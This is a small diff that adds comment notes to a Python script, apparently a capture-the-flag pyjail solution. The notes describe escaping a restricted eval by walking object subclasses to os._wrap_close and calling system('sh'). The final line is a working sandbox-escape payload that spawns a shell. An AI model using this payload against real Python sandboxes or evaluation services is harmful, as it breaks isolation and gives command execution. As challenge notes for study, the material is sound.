@@ -39,3 +39,13 @@ def main():
  
 if __name__ == '__main__':
     main()
+
+
+# here bytes is block, so I can not use open
+# but I can use __class__ and find the object for os._wrap_close_
+# to find that I can use sysfinder tool or like below:
+# clsss = "".__class__.__base__.__subclasses__()
+# [(i, x) for i, x in enumerate(clsss) if "os" in x.__name__]
+# then I can use the my_eval_func(my_input_func)
+#  my_eval_func_002EFCDB(my_input_func_000FDCAB())
+#  ().__class__.__base__.__subclasses__()[154].__init__.__globals__['system']("sh")
